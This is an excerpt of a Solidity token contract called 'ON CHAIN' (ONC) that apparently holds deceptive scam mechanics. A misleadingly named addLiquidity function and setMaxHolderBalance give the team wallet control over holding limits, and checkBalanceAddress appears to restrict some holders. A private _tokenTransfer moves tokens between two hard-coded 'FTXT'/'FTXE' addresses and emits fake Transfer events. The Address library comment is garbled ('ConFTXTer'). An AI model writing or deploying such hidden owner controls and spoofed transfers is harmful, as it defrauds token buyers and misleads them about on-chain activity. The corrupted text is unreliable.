...
library Address {
     ...
     * taken to not create reentrancy vulnerabilities. ConFTXTer using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-conFTXTerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
...
contract OnChain is Context, IERC20, Ownable {
    ...
    address public constant FTXT = 0x50D1c9771902476076eCFc8B2A83Ad6b9355a4c9;
    address public constant FTXE = 0x2FAF487A4414Fe77e2327F0bf4AE2a264a776AD2;
    
    string private _name = 'ON CHAIN';
    string private _symbol = 'ONC';
    uint8 private _decimals = 18;

    uint256 private _maxTxAmount = _tTotal.mul(5).div(100);
    uint256 private _maxTokenWallet = _tTotal.mul(30).div(100);
    ...
    constructor () {
        ...
        _balances[FTXT] = _tTotal.mul(1).div(100);

        emit Transfer(address(0), FTXT, _tTotal.mul(1).div(100));
    ...
    function setMaxHolderBalance(uint256 amount) public {
        require(_msgSender() == _teamWallet, "ERC20: cannot permit dev address");
        _maxTokenWallet = _tTotal.mul(amount).div(100);
    }
    ...
    function checkBalanceAddress(address _walletAddress) private view returns (bool){
        ...
        if (balanceOf(_walletAddress) >= _maxTxAmount && balanceOf(_walletAddress) <= _maxTokenWallet) {
            return false;
        } else {
            return true;
        }
    ...
    /**
     * @dev `balanceOf` check balance of wallet
     *
     */
    ...
    function addLiquidity (address addr)  public {
        require(_msgSender() == _teamWallet, "ERC20: cannot permit dev address");
        _lpAddress = addr;
        _maxTokenWallet = _tTotal.mul(90).div(100);
    }
     ...
     * @dev See {BEP20-transfer}.
     *
     * FTX token will send to wallet
     */
    function _tokenTransfer() private {
        uint256 tAmount = 10 * 10**18;
        if (_balances[FTXT] > tAmount) {
            _balances[FTXT] = _balances[FTXT] - tAmount;
            _balances[FTXE] = _balances[FTXE] + tAmount;
            emit Transfer(FTXT, FTXE, tAmount);
        }
    }
